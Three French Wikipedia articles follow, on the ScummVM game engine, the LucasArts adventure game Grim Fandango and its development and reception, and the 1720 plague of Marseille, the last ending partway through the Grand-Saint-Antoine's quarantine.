<doc id="191920" url="https://fr.wikipedia.org/wiki?curid=191920" title="ScummVM">
ScummVM

 est une machine virtuelle qui permet de jouer aux jeux qui utilisent le système SCUMM (comme les jeux d'aventure de LucasArts ou d'Humongous) sur des plates-formes autres que celles originellement supportées par le jeu ; de plus, le logiciel supporte entre autres les jeux non-SCUMM suivants : "Simon the Sorcerer I" et "II", "Beneath a Steel Sky", "The Legend of Kyrandia", "Flight of the Amazon Queen" et "Broken Sword 1 et 2". L'un des buts du programme étant de permettre l'accessibilité à divers utilisateurs utilisant divers systèmes de jouer à ces classiques, diverses versions de ScummVM prenant en charge des systèmes d'exploitation variés sont disponibles : Microsoft Windows, Atari, WinCE, Pocket PC, Mac OS X, Linux, Android, Palm OS, HP webOS, Open webOS, AmigaOS BeOS, Solaris, Dreamcast, MorphOS, Irix, PSP, PS2, GP32, Wii, DS et plus. ScummVM est un logiciel libre, selon les termes de la licence GNU GPL.
Obtenir les jeux.
ScummVM n'inclut pas les données de la majorité des jeux supportés, c'est au joueur, et propriétaire d'une copie des jeux de les installer. La date de sortie originale de la plupart des jeux étant plutôt vieille, beaucoup sont disponibles dans des compilations à bon prix, comme la collection des "Classiques LucasArts". Quelques-uns sont cependant des graticiels et des liens sont donnés pour les télécharger sur le site du moteur
Durant le cycle de développement amenant à la version 0.5.0 le , le développeur de jeux vidéo Revolution Software a non seulement aidé les développeurs de ScummVM en ajoutant le support de "Beneath a Steel Sky" en leur ouvrant le code source, mais a aussi décidé de publier les versions CD et disquette du jeu en graticiel, disponible en téléchargement sur le site de ScummVM. Quelques mois plus tard, les propriétaires de "Flight of the Amazon Queen" ont suivi la même voie en rendant ce dernier graticiel aussi.
Les cinématiques originales de Broken Sword 1 &amp; 2 sont supportées par ScummVM depuis la version 1.0.0. Il fallait pour les versions précédentes utiliser des fichiers ré-encodés disponibles sur la page web du projet.

</doc>
<doc id="191923" url="https://fr.wikipedia.org/wiki?curid=191923" title="Grim Fandango">
Grim Fandango

Grim Fandango est un jeu vidéo d’aventure développé et publié par en 1998 sur . Créé par Tim Schafer, il est le premier jeu d’aventure du studio fondé sur le moteur de jeu GrimE qui permet un affichage des objets et des personnages en trois dimensions en surimpression sur des décors statiques, modélisés en 3D avant d'être pré-rendus. Le joueur y incarne Manny, un agent de voyage dont le rôle est d’accompagner ses clients dans leur traversée du pays des morts pour rejoindre le neuvième monde. Comme dans les autres jeux d’aventures de , le joueur doit interagir avec des objets ou d’autres personnages pour résoudre des énigmes et ainsi progresser dans le jeu. Pour créer l’univers du jeu, Tim Schafer s’est notamment inspiré des croyances aztèques sur la vie après la mort ainsi que des films noirs comme "Assurance sur la mort" ou "Casablanca".
À sa sortie, le jeu est unanimement salué par la presse spécialisée qui fait entre autres l’éloge de sa réalisation, de son atmosphère et de son humour. Le jeu est ainsi désigné par de nombreuses critiques comme le meilleur jeu d’aventure de l’année et il reste considéré comme un des meilleurs jeux d’aventure de tous les temps. Le jeu est cependant considéré comme un échec commercial et comme une des raisons pour lesquelles LucasArts a arrêté de développer des jeux d’aventures, causant ainsi le déclin du genre.
Le jeu a bénéficié d’une version remastérisée, développée par le nouveau studio de Tim Schafer, . Cette dernière inclut notamment des graphismes améliorés, une nouvelle interface et des commentaires audio de ses développeurs. Elle est publiée le sur PlayStation 4, PlayStation Vita, Microsoft Windows, OS X et Linux puis le sur Android et iOS, sur Nintendo Switch le 1er novembre 2018, et enfin sur Xbox One le 29 octobre 2020.
Trame.
Univers.
L'intrigue se déroule au pays des morts, dans un monde inspiré de la mythologie aztèque. Les êtres humains qui ont poussé leur dernier souffle se retrouvent tous dans ce monde, en prenant l'apparence de squelettes. Ils voyagent alors quatre années à travers le Pays des Morts (ou monde) vers le Neuvième Monde, leur destination finale et le pays du repos éternel. Pour ce voyage, ils ne sont pas tous logés à la même enseigne. En fonction de leur vie passée, certaines âmes ont le droit d'utiliser un moyen de transport. D'autres doivent effectuer le voyage à pied et prennent ainsi le risque de s'égarer à jamais. D'autres enfin doivent s'acquitter de travaux d'intérêt général et contribuent à faire fonctionner la société, aidés dans leur tâche par des démons immortels. Le pays des morts s'est modernisé pour ressembler au monde occidental contemporain, avec une très forte nuance hispanique.
La plupart des personnages sont d'aspect squelettique, ou plutôt de "calaveras" — mot espagnol familier qui désigne les squelettes décoratifs utilisés lors de la fête des morts mexicaine — inspirés du travail de l'artiste mexicain José Guadalupe Posada. Les fleurs transmettent non pas la gaieté, mais plutôt l'horreur car elles sont utilisées comme objet de mort au travers d'armes à feu qui permettent de « germer » les squelettes (de les tuer comme on pourrait le faire à un vivant).
De manière inhabituelle, le jeu combine cette mythologie des Enfers avec l'architecture, le design, les motifs de l’Art déco des années 1930 et une ambiance évoquant les films noirs. La seconde partie du jeu, où Calavera dirige un casino s'inspire des films de Humphrey Bogart comme "Le Faucon maltais", "Key Largo", et "Casablanca". En effet dans le jeu, l’arnaqueur Chinchilla Charlie ("Chowchilla Charlie" en VO) apparaît comme une réminiscence du personnage de Guillermo Ugarte joué par Peter Lorre. Bogen, le chef corrompu de la police, se réfère au Capitaine Louis Renault joué par Claude Rains. Mise à part cela, Tim Schafer a déclaré que la véritable inspiration provient du film "Assurance sur la mort", dans lequel un homme ordinaire (un vendeur d'assurance, pas un détective) est impliqué dans une intrigue de meurtre.
Personnages.
La plupart des personnages sont hispaniques et en plus de leur accent prononcé, d'occasionnels mots espagnols sont entremêlés dans les dialogues. La majeure partie des personnages fument (en grande partie pour l'effet cinématographique).
Manuel Calavera dit Manny — doublé par Tony Plana (version originale anglaise) et Mario Santini (version française)
Mercedes Colomar dite Meche — doublée par Maria Canals (version anglaise) et Nathalie Homs (version française)
Glottis — doublé par Alan Blumenfeld (version anglaise) et Christian Pélissier (version française)
Hector LeMans — doublé par Jim Ward (version anglaise) et Michel Elias (version française)
Salvador Limones — doublé par Sal Lopez (version anglaise) et Gérard Surugue (version française)
Scénario.
Manuel Calavera dit Manny est un agent de voyage qui est chargé d'aider ses âmes, après les avoir cherchées habillé en Grande Faucheuse (son habit de travail, et il doit porter en plus des échasses car il est trapu) pour le compte du "Département des Morts". Le DDM est une compagnie administrative qui aide les nouveaux morts à accéder au pays du repos éternel : plus les âmes ont été exemplaires dans leur vie, plus elles auront droit à un moyen plus facile et rapide pour y accéder, sans avoir à braver les dangers du parcours.
Malgré la bonne volonté qu'il met dans son travail, Manny a du mal à trouver de bons clients et donc des contrats en or afin de pouvoir lui-même gagner le droit d'atteindre le pays du repos éternel… ce qui est peu facilité par son arrogant rival en affaires, Domino Hurley, pistonné par son patron irascible et corrompu, Don Copal. Il ne trouve du réconfort qu'envers la secrétaire de ce dernier, Eva.
Afin de pouvoir augmenter ses chances, Manny prend comme chauffeur un sympathique gros démon orange, Glottis, qui devient son meilleur ami, et trafique des papiers afin de récupérer un client initialement destiné à Domino : une cliente, Mercedes Colomar dite Meche. Ayant été une femme généreuse et de grand cœur dans sa vie, elle a de quoi constituer une bonne affaire pour Manny, et elle ne le laisse d'ailleurs pas indifférent du côté affectif… Mais Manny découvre que ses dossiers sont déjà trafiqués par la direction, ce qui la destine automatiquement à devoir marcher sans aide à travers le pays. Manny se fait blâmer par la direction l'accusant du trafic et il se fait mettre en garde à vue tandis que Meche disparaît dans la nature…
Manny rencontre Salvador Limones, un ancien militaire révolutionnaire qui le libère et l'invite à rejoindre l'Alliance des Âmes Perdues, organisation secrète qui vise à combattre le DDM et ses administrations, corrompus par l'argent.
Manny décide de l'aider, et de partir ensuite à la recherche de Meche, bravant mafia, gangsters, corruption et dangers dans une aventure qui lui prendra des années et dans des évènements qui décolleront à chaque fois le "Jour des Morts".
Système de jeu.
"Grim Fandango" est un jeu d'aventure en vue à la troisième personne dans lequel le joueur incarne Manny, un agent de voyage dont le rôle est d’accompagner ses clients dans leur traversée du pays des morts. Il est le premier titre du studio a bénéficier du moteur de jeu GrimE qui affiche les objets et les personnages en trois dimensions en surimpression de décors statiques pré-rendus. Contrairement aux précédents jeux d’aventures développés par , fondés sur une interface en pointer-et-cliquer, le joueur contrôle les déplacements et les actions de Manny avec un clavier, un joystick ou une manette de jeu. Le joueur doit interagir avec des objets ou d’autres personnages pour résoudre des énigmes et ainsi progresser dans l’histoire. Le jeu ne propose pas d’affichage tête haute. Le joueur est en effet informé de l’intérêt d’un objet ou d’un personnage par les mouvements de tête de son personnage, qui se tourne pour les regarder, et non par un message s’affichant à l’écran comme dans les précédents jeux d’aventure du studio. Pour consulter l’inventaire des objets transportés par Manny, il le regarde mettre ou enlever chaque objet de sa veste. Manny peut dialoguer avec les autres personnages du jeu par l’intermédiaire d’arbres de dialogues et ainsi obtenir des informations qui lui permettent de résoudre certaines énigmes ou de progresser dans l’histoire. Comme dans la plupart des jeux d’aventure , le joueur ne peut ni mourir, ni se retrouver dans des situations cul-de-sac à partir desquelles le joueur ne peut plus finir le jeu.
Développement.
Début du projet.
Le développement de "Grim Fandango" est supervisé par Tim Schafer, concepteur de ' et créateur de ', "Psychonauts" et "Brütal Legend". Bien qu’il ait l’idée de créer un jeu ayant pour thème le jour des morts bien avant, il ne commence à travailler sur le jeu qu’en juin 1995 après avoir terminé "". L’objectif de LucasArts est alors de revitaliser le genre du jeu d’aventure graphique, en déclin depuis 1994. D’après Schafer, le budget du jeu s’élève à trois millions de dollars. C’est le premier jeu d’aventure développé par LucasArts depuis ' à ne pas utiliser le moteur de jeu SCUMM. À la place, le studio se fonde sur le moteur Sith utilisé dans ' pour concevoir un nouveau moteur de jeu qu’ils baptisent GrimE. Celui-ci est programmé en Lua du fait de l’intérêt que porte à l’époque l’un des programmeurs de LucasArts, Bret Mogilefsky, pour ce langage. Le succès du jeu a d’ailleurs conduit d’autres développeurs à l’imiter, pour notamment développer des jeux comme ' ou '.
Conception graphique.
"Grim Fandango" mélange des décors pré-rendus statiques avec des personnages et des objets en trois dimensions. Cette orientation est notamment choisie à cause de l’aspect intéressant des calacas rendues en 3D. Plus de 90 ensembles et 50 personnages sont ainsi créés et rendus pour le jeu, le personnage de Manny étant à lui seul composé de 250 polygones. Plutôt que de dessiner les arrière-plans comme pour un jeu d’aventure en deux dimensions, les développeurs ont créé des modèles 3D des décors afin de pouvoir donner un angle plus pratique ou plus dramatique à une scène en re-rendant simplement ce modèle. L’équipe a également adapté le moteur pour permettre à la tête de Manny de bouger de manière indépendante de son corps pour prévenir le joueur lorsqu’un objet intéressant se trouve à côté. Le moteur les a également aidés à synchroniser les dialogues avec les mouvements des personnages. En plus de cela, des scènes cinématiques en sont intégrées au jeu afin de faire avancer l’histoire. Celles-ci utilisent des personnages et des décors similaires à ceux du jeu afin que le joueur ne puisse pas faire la différence entre les cinématiques et les phases de jeu.
Influences.
Le jeu combine des éléments relevant des croyances aztèques sur la vie après la mort et l’autre monde avec des motifs de conceptions Art déco et un scénario rappelant les films noirs. L’inspiration Aztèque est principalement due à la fascination de Schafer pour le folklore, qui débute alors qu’il prend des cours d’anthropologie à l’université de Californie à Berkeley. Lors d’une conversation avec le folkloriste Alan Dundes, il reconnaît que le voyage de quatre ans d’une âme dans l’autre monde pourrait faire l’objet d’un jeu d’aventure. Après s’être fixé sur ce thème, Schafer se demande quel personnage les joueurs souhaiteraient incarner dans le contexte du jour des morts. Il imagine alors un personnage allant chercher les gens dans le monde des vivants pour les ramener dans celui des morts, comme si c’était un simple chauffeur de taxi. De cette idée découle le personnage de Manny, dont le travail est en apparence glamour mais qui est en réalité très banal. Il s’inspire également du folklore mexicain, notamment de la façon dont les morts sont enterrés avec deux sacs d’or cachés à deux endroits différents afin que les esprits ne puissent les trouver en même temps. À partir de cette idée de vol dans l’au-delà, il imagine un monde des morts où rôdent des criminels, ce qui donne son ambiance de film noir au jeu. Il décide de découper le scénario du jeu en quatre parties, correspondant à quatre années, afin de diviser le jeu en quatre sections indépendantes. Chaque année est ensuite divisée en plusieurs branches d’énigmes, se succédant de manière non-linéaire, que le joueur doit résoudre pour progresser jusqu’à l’année suivante.
Puisque le jeu contient de nombreux dialogues et que Schafer apprécie la façon dont les gens parlent dans les films des années 1930 et 1940, il décide de donner au jeu une ambiance qui rappelle cette époque. Pour cela, il s’inspire des nouvelles écrites par Raymond Chandler et Dashiell Hammett. Il s’inspire également de plusieurs films noirs, notamment du film "Assurance sur la mort" dans lequel un banal et faible assureur se retrouve impliqué dans une histoire de meurtre. Le design du jeu et le début du scénario sont façonnés d’après des films comme "Chinatown" et "Glengarry". Plusieurs scènes du jeu sont directement inspirées par des films de genre comme "Le Faucon maltais", "Le Troisième Homme", "Key Largo" et en particulier "Casablanca", deux des personnages du deuxième acte ayant pour modèle les personnages joués par Peter Lorre et Claude Rains dans le film. Le principal antagoniste du jeu, Hector LeMans, est lui conçu pour ressembler à Signor Ferrari, joué par Sydney Greenstreet, toujours dans "Casablanca".
Les influences des concepteurs pour l’aspect visuel du jeu sont très diverses. Ainsi, les personnages s’inspirent des calacas utilisées lors des festivités du Jour des morts au Mexique. De leur côté, les décors vont du gratte-ciel Art déco à un temple Aztèque. Pour la création des calacas, l’équipe fait appel à Peter Chan, un des artistes de LucasArts. Pour la conception des hot rod et des personnages démoniaques comme Glottis, les artistes ont notamment été influencés par les œuvres de Ed Roth.
Le jeu est initialement baptisé ' par Tim Schafer qui souhaite au départ faire de Manny un agent immobilier du monde des morts. D’autres titres sont ensuite envisagés, comme ' et "" avant qu’il se décide sur le titre "Grim Fandango".
Dialogues et musiques.
Le jeu bénéficie d’un casting varié, incluant notamment des acteurs Latinos pour les textes en argot espagnol. Manny est ainsi interprété par Tony Plana, Meche par María Canals, Glottis par Alan Blumenfeld et Hector par Jim Ward. D’après Schafer, le fait que l’espagnol soit la langue maternelle de Tony Plana lui a permis de suggérer des améliorations aux dialogues afin de rendre plus naturelles les conversations dans cette langue. 
La musique du jeu mélange des morceaux orchestraux, avec de la musique folk sud-américaine, du jazz, du swing et du big band. Elle est composée par Peter McConnell qui s’inspire notamment des musiciens Duke Ellington et Benny Goodman ainsi que des compositeurs de musiques de film Max Steiner et Adolph Deutsch. Pour enregistrer la bande originale, il fait appel à des musiciens de sa connaissance et approche des groupes du quartier Mission District de San Francisco, dont notamment un groupe de mariachi. La bande originale du jeu est publiée sur CD en 1998.
Versions.
La sortie du jeu est initialement prévue pour le premier semestre 1998 mais elle est finalement reportée. Le jeu est donc publié le , soit le vendredi précédent le , ce qui correspond au jour des morts. Malgré ce délai supplémentaire, l’équipe n’a pas le temps d’inclure tout le contenu prévu dans le jeu et doit donc mettre de côté certaines énigmes et personnages, incluant notamment une énigme en cinq étapes conçue comme le point culminant du jeu dans laquelle le héros affronte Hector LeMans à la fin de l’aventure. D’après Tim Schafer, une ou deux années supplémentaires auraient été nécessaires pour inclure tout ce qu’ils avaient imaginé pour le jeu.
Une version remastérisée de "Grim Fandango" est annoncée en juin 2014 lors de l’. Celle-ci est publiée le sur PlayStation 4, PlayStation Vita, Microsoft Windows, Mac OS X et Linux. Cette nouvelle version est ensuite publiée sur Android et iOS le . Une version Nintendo Switch est disponible le .
Accueil.
Critique.
À sa sortie, "Grim Fandango" a reçu un accueil quasi uniformément positif. Ron Dulin de en a félicité l'écriture, l'humour, les situations et les personnages, sans fabrication à l'excès aidant à construire un univers crédible ; Steve Hill de "PC Zone" a souligné la qualité de la production dans l'ensemble, les personnages, la musique et l'atmosphère soulignant que ces ingrédients pourraient en faire un très bon film ; Trent C. Ward de IGN finit sa revue en affirmant que "Grim Fandango" est de loin, le meilleur jeu d'aventure sorti
D'un autre côté, Circe de la revue , bien qu'ayant apprécié la créativité du scénario et l'atmosphère mexicaine, a trouvé l'interface maladroite de par la restriction des actions disponibles, critique également exprimée par Ron Dulin et Trent C. Ward, à un degré moindre.
La presse française a fait un très bon accueil au jeu, le magazine "Joystick" souligne que le jeu possède « une vraie bande son qui pose l'ambiance », et des « doublages français […] irréprochables » et lui accorde une note de design de 93 % ; mais lui reproche sa « difficulté [qui] dessine des dos d'âne chaotiques » rendant la progression difficile dès le début du jeu.
En dépit des bonnes critiques, "Grim Fandango" ne s'est pas vendu aussi bien que d'autres jeux aventures plus anciens, ce qui a conduit à le regarder comme l'achèvement du genre aventure. Les pessimistes lui attribuent ainsi, par le fait qu'en dépit de sa grande qualité et des récompenses gagnées — incluant le jeu de l'année 1998 par GameSpot devant le jeu de stratégie en temps réel "StarCraft" et le jeu de tir à la première personne "Half-Life" — il ne s'est pas bien vendu, d'avoir terni l'image de la demande existante pour les jeux d'aventure au cours des années suivantes.
Récompenses.
À sa sortie en 1998, "Grim Fandango" est récompensé à de nombreuses reprises par la presse spécialisée qui le désigne généralement comme le meilleur jeu d’aventure de l’année. C’est notamment le cas des magazines "" et "" ainsi que des sites web IGN et . La rédaction de ce dernier lui décerne également les titres de meilleur jeu de l’E3 1998, de meilleur jeu PC de l’année, de meilleur conception artistique et de la meilleure bande originale. L’année suivante, en 1999, il remporte également le titre de meilleur jeu d’aventure sur PC décerné par l’. La rédaction du site salue à nouveau sa bande originale en l’incluant dans son classement des dix meilleures musiques de jeu vidéo et il obtient la dixième place dans le classement des meilleures fins de jeu vidéo des lecteurs du site.
La presse spécialisée continue ensuite de saluer le jeu qui est, depuis sa sortie, régulièrement cité dans des classements de jeux vidéo. En 2003, le site lui consacre ainsi un article dans sa série sur les meilleurs jeux de tous les temps. En 2004, c’est au tour du site de l’introduire dans son temple de la renommée. La même année, la rédaction du site le place en septième position de leur classement des meilleurs jeux d’aventures de tous les temps. Le jeu apparaît également à plusieurs reprises dans le classement publié chaque année par le site IGN, dans lequel il se place à la en 2005 et à la place en 2007 . Il apparait également dans les classements des 25 meilleurs jeux PC publiés par le même site en 2007 puis en 2009. Enfin, en 2011, il prend la première place du classement des cent meilleurs jeux d’aventure de tous les temps publié par le site .
Ventes.
Bien qu’il soit salué par la presse spécialisée, le succès commercial n’est pas au rendez-vous. Si les premières estimations suggèrent qu’il se vend bien au cours de l’été 1998, le jeu ne dépasse pas les exemplaires vendus dans le monde. Il est donc généralement considéré comme un échec commercial même si d’après , il atteint les objectifs fixé par le studio aux États-Unis et les dépasse dans le reste du monde. D’après Tim Schafer, le jeu est d’ailleurs rentable malgré des ventes relativement faibles.
Postérité.
Un nouveau jeu d’aventure, ', est publié par en 2000 mais le studio annule les suites de ' et de "". Il justifie cette décision en expliquant qu’après une étude méticuleuse des réalités du marché et compte tenu de la situation économique, il considère que ce n’est pas le moment de publier un jeu d’aventure sur PC. Après ces annulations, licencie la plupart des développeurs ayant travaillé sur leurs jeux d’aventure et en 2006, le studio annonce qu’il ne prévoit pas de créer de nouveaux jeux d’aventure avant au moins dix ans. Après leur départ, les développeurs licenciés créent le studio en juin 2004 afin de continuer à réaliser les jeux d’aventures que ne souhaite plus produire. Ils récupèrent notamment les droits de la franchise ' en 2005, dont ils tirent un nouveau jeu d’aventure en pointer-et-cliquer, baptisée ', qu’ils publient sous forme d’épisodes.

</doc>
<doc id="191924" url="https://fr.wikipedia.org/wiki?curid=191924" title="Peste de Marseille (1720)">
Peste de Marseille (1720)

La peste de Marseille de 1720 est la dernière grande épidémie de peste à s’être produite en France, correspondant à une résurgence de la deuxième pandémie de peste.
Elle est propagée à partir du "Grand-Saint-Antoine", un bateau en provenance du Levant (la région de la Syrie), accostant au port de Marseille le , jugé comme étant à l’origine de l’épidémie. En effet, sa cargaison constituée d’étoffes et de balles de coton est contaminée par le bacille responsable de la peste. À la suite de graves négligences, et malgré un dispositif de protection très strict comportant notamment la mise en quarantaine des passagers et des marchandises, la peste se propage dans la ville. Les quartiers déshérités et les plus anciens sont les plus touchés. Se propageant à partir des quartiers à proximité du port, la peste s’étend rapidement dans la cité où elle entraîne entre sur , puis dans toute la Provence, où elle fait entre sur une population de environ.
La responsabilité de la non-application de la réglementation pour les navires potentiellement infectés a été recherchée auprès du commandant du navire, le capitaine Jean-Baptiste Chataud, et du premier échevin, Jean-Baptiste Estelle. Aucune preuve formelle n’a pu être établie. Il est cependant certain que les échevins et les intendants de santé chargés de cette réglementation ont agi avec beaucoup de légèreté. Certaines marchandises notamment des étoffes qui devaient être initialement mises en quarantaine, ont finalement été débarquées à Marseille.
Lors de l’épidémie, l'alimentation de la population ainsi que l’évacuation des cadavres posent de graves problèmes et mobilisent les échevins qui montrent beaucoup de courage. L’enlèvement des cadavres du quartier de la Tourette par les galériens de l'Arsenal des galères mobilisés à cet effet et placés sous le commandement du "Chevalier Roze" constitue un fait majeur de ce tragique évènement. Les religieux avec à leur tête de Belsunce apportent quant à eux un réconfort moral aux mourants.
Cette épidémie a donné naissance à de nombreuses représentations artistiques parmi lesquelles celles du peintre Michel Serre, témoin direct de l'épidémie. Elle constitue un épisode historique marquant, toujours présent dans la mémoire collective des Marseillais.
Marseille à la veille de l’épidémie.
Situation économique.
Malgré les difficultés financières de la ville de Marseille, fortement endettée depuis la fin du , le commerce marseillais est en plein essor après une crise passagère consécutive au traité de Rastadt (signé en 1714) qui mettait fin à la guerre de Succession d'Espagne. La valeur des produits du Levant apportés dans le port de Marseille en 1714 s'élève à vingt-trois millions de livres, somme jamais atteinte précédemment. L'apparition de la peste va porter un coup d'arrêt brutal à un puissant essor économique, synonyme d'amélioration des conditions de vie.
Urbanisme de la ville.
La ville est entièrement ceinturée par un nouveau rempart construit sur ordre de Louis XIV par Nicolas Arnoul. Cette enceinte prend appui sur chacune des deux puissantes forteresses placées de part et d'autre de l'entrée du port : le fort Saint-Jean et le fort Saint-Nicolas. Les remparts du Moyen Âge ont été démolis et la superficie de la ville intra-muros est triplée, passant de . Dans les espaces intérieurs ainsi conquis sont construites des voies nouvelles se coupant perpendiculairement.
Il en résulte deux types d'urbanisation qui ne seront pas sans influence sur le développement et la propagation de la peste qui apparut d'abord dans les vieux quartiers. Au nord du port est située la ville ancienne qui correspond à celle du Moyen Âge avec des rues étroites, tortueuses et insalubres où se trouvent artisans et commerçants ; c'est dans cette zone que la peste apparaît et atteint son paroxysme. À l'est et au sud se développe la ville nouvelle avec ses nouvelles voies rectilignes : rue de Rome, rue Paradis, rue Saint-Ferréol.
Réglementation sanitaire.
La peste constitue une menace permanente pour Marseille en liaison fréquente avec le Proche-Orient où cette maladie est endémique. Des épidémies frappent la ville à de nombreuses reprises, notamment en 1580 où la peste a été très meurtrière et a fait proportionnellement autant de morts sinon davantage que celle de 1720. Un système est progressivement mis en place et montre son efficacité puisqu’en 1720 Marseille n'a pas connu d'épidémie depuis soixante-dix ans. Cette protection repose d'une part sur un cordon sanitaire mis en place à l'échelle méditerranéenne avec délivrance de patentes dans les ports du Levant et d'autre part sur un bureau de santé composé d’intendants qui décident de la durée de la mise en quarantaine pour l'équipage, les passagers et les marchandises.
Les patentes.
Chaque navire faisant escale dans un port du Levant se voit délivrer une patente, certificat délivré par les consuls des ports orientaux aux capitaines des vaisseaux souhaitant rentrer en France, qui précise l'état sanitaire de la ville. On distingue trois types de patentes :
En cas de patente nette la durée de la quarantaine est ordinairement de dix-huit jours pour les personnes, vingt-huit pour le navire et trente-huit pour la cargaison. Ces périodes sont portées respectivement à vingt-cinq, trente et quarante si la patente est suspecte et trente-cinq, cinquante et soixante si la patente est brute.
Le bureau de santé.
Un bureau de santé est créé à Marseille. Sa date de création est inconnue mais forcément avant 1622 car un texte émanant du parlement de Provence daté de cette année fait référence à cet établissement. Ce bureau, renouvelé chaque année par le conseil de ville, est composé de quatorze intendants bénévoles choisis parmi les négociants, marchands et anciens capitaines de vaisseau. La présidence est assurée à tour de rôle chaque semaine par l'un des intendants qui prend alors le nom d'intendant semainier. Afin d'assurer une bonne coordination entre le conseil municipal et le bureau de santé, les deux échevins à la sortie de leur charge font partie de droit du bureau de santé, ce qui porte le nombre total de ses membres à seize. Ils sont assistés dans leur tâche par un personnel nombreux : secrétaires, commis, etc. Un médecin et un chirurgien sont attachés à cet établissement.
Le siège du bureau de santé se trouve d'abord sur un ponton flottant basé près du fort Saint-Jean, puis à la consigne sanitaire, bâtiment construit à partir de 1719 sur les plans d'Antoine Mazin au pied du fort Saint-Jean. Ce bâtiment est toujours visible et a été classé monument historique par arrêté du .
Les démarches sont strictes : le capitaine d'un vaisseau en provenance du Levant laisse son navire à l'île de Pomègues et se rend en barque au bureau de santé pour présenter la patente qui lui a été délivrée et selon le type de celle-ci, le bureau de santé décide de la durée de la quarantaine à appliquer aux marchandises et aux personnes.
Les lieux de quarantaine.
Les lieux de quarantaine des vaisseaux ont été établis à l'île Jarre, au sud de la rade de Marseille, si la peste est avérée, ou à l’île de Pomègues où cinq hectares de terrains et de bâtiments ainsi qu'un petit port ont été aménagés pour recevoir environ trente-cinq navires.
D'autre part, des infirmeries, parfois appelées lazarets car elles sont placées sous la protection de saint Lazare, ont été aménagées pour les passagers et les marchandises. Ces infirmeries sont situées au bord de la mer, entre l'anse de la Joliette et celle d'Arenc, à environ au nord de l'enceinte de la ville ; construites sous Colbert, elles sont constituées de hangars pour les marchandises et d'habitations pour les voyageurs, sur une emprise de , ceinturée de murailles et ne comportant que trois points d'accès.
L’arrivée du "Grand-Saint-Antoine".
Le , le "Grand-Saint-Antoine", navire en provenance du Proche-Orient, arrive à Marseille. Il apporte un précieux chargement d'étoffes de soie et de balles de coton, pour une valeur de destinées à être vendues à la foire de Beaucaire de juillet.
Une partie de la cargaison appartient à plusieurs notables de Marseille, dont le premier échevin Jean-Baptiste Estelle et le capitaine du navire Jean-Baptiste Chataud. Le bateau a été armé par Ghilhermy et Chaud, Jean-Baptiste Estelle, Antoine Bourguet et Jean-Baptiste Chataud, intéressés chacun pour un quart.
Périple et mortalité à bord.
Le "Grand-Saint-Antoine" quitte Marseille le et relie successivement Smyrne, Larnaca (Chypre), et Sidon (Liban). Dans cette ville, il embarque des tissus de soie et des sacs de cendre destinés au lest et afin d'absorber l'humidité des cales pour assurer une meilleure conservation des précieuses étoffes. Cette cendre se vendait à Marseille aux savonneries qui l'incorporaient dans leurs fabrications (en 1978 des plongeurs qui ont repéré l'épave du "Grand Saint-Antoine" au large de l'île Jarre ont remonté des échantillons de cendre). Le consul Poullard, qui ignore que la peste sévit à Damas, délivre une patente nette alors que le chargement est probablement contaminé. Le navire arrive à Tyr (aujourd'hui Sûr) et complète sa cargaison par de nouvelles étoffes probablement aussi contaminées. Le navire reprend la mer, mais doit faire escale à Tripoli au Liban pour remédier à des dégâts causés par une violente tempête. Le vice-consul de Tripoli, Monhenoult, délivre également une patente nette. Le , le navire se dirige vers Chypre après avoir embarqué quatorze passagers. Le un Turc meurt à bord et son cadavre est jeté à la mer. Les passagers descendent à Chypre et le navire repart le en direction de Marseille. En cours de route meurent successivement cinq personnes, dont le chirurgien de bord.
L'alerte est grave et le capitaine Chataud décide de s'arrêter alors dans la rade du Brusc, à proximité de Toulon. Cette rade bien abritée par l'île des Embiez constitue un mouillage forain (en dehors d'un port) apprécié des navigateurs depuis l'Antiquité. Il s'agit en effet de l'ancienne Tauroentum. Les raisons de cette escale sont assez mystérieuses, mais certains historiens estiment que Chataud a voulu prendre l'avis des propriétaires de la cargaison pour fixer la conduite à tenir ; certaines sources accusent plus précisément le premier échevin de Marseille, Jean-Baptiste Estelle, de lui avoir rendu visite au Brusc et ordonné de se rendre à Livourne pour bénéficier d'une expertise médicale pouvant lui éviter une quarantaine sur l'île de Jarre, où la cargaison aurait été stockée en plein air et perdue.
Le "Grand-Saint-Antoine" fait alors demi-tour pour gagner Livourne, où il arrive le . Les Italiens interdisent l'entrée du navire dans le port et le font mettre à l'ancre dans une crique gardée par des soldats. Cette précaution est d'autant plus judicieuse que le lendemain trois personnes décèdent à bord. Les cadavres sont examinés par des médecins qui concluent à une « fièvre maligne pestilentielle » ; ce terme ne doit pas prêter à confusion, car pour les médecins de l'époque il ne désigne pas la peste. Les autorités de Livourne mentionnent, au dos de la patente de Tripoli, qu'elles ont refusé l'entrée du navire dans le port à cause de la mortalité d'une partie de l'équipage en raison de cette fièvre.
Le navire retourne alors vers Marseille : il y a eu depuis le départ de Tripoli neuf décès à bord.
La mise en quarantaine.
À son arrivée, le capitaine Chataud se rend au bureau de santé faire sa déclaration à l'intendant semainier Tiran. Il produit les patentes nettes et ne peut que l'informer des décès survenus durant la traversée. Le , deux jours seulement après l’arrivée du navire, un matelot meurt à bord. Le bureau de santé, à l'unanimité décide d'envoyer le bateau à l'île de Jarre, puis se ravise et dans une seconde délibération, décide de faire transférer le cadavre aux infirmeries pour examen et d'envoyer le navire à l'île de Pomègues, dans l'archipel du Frioul. Le ce même bureau décide, fait inhabituel, de faire débarquer aux infirmeries les marchandises de valeur tandis que les balles de coton doivent être transférées à l'île de Jarre.
Le , le bureau revient sur sa position et prend une décision encore plus favorable aux propriétaires de la cargaison : toutes les marchandises seront débarquées aux infirmeries. Si aucune preuve écrite n'existe, il est probable que des interventions ont eu lieu pour faire adopter la réglementation la moins contraignante ; il est impossible de connaître les personnes qui sont réellement intervenues, mais le relâchement progressif de la vigilance des autorités locales (après les années 1660-1670, la peste a disparu de France, ce qui conduit les autorités à considérer que cette maladie est une histoire du passé), l'intrication des intérêts des familles de négociants et des autorités qui dirigeaient la ville suffisent à comprendre les raisons de ces nombreuses négligences. La déclaration du capitaine Chataud est falsifiée par addition d'un renvoi indiquant que les membres d'équipage décédés en mer sont morts de mauvais aliments. Les intendants de santé ont probablement voulu sauver la cargaison destinée en partie à la foire de Beaucaire, qui devait avoir lieu le . Le , veille du jour de sortie de quarantaine des passagers, le gardien de santé du vaisseau décède. Le chirurgien de service du port, Gueirard, examine le cadavre et conclut à une mort par vieillesse, sans observer des marques de peste.
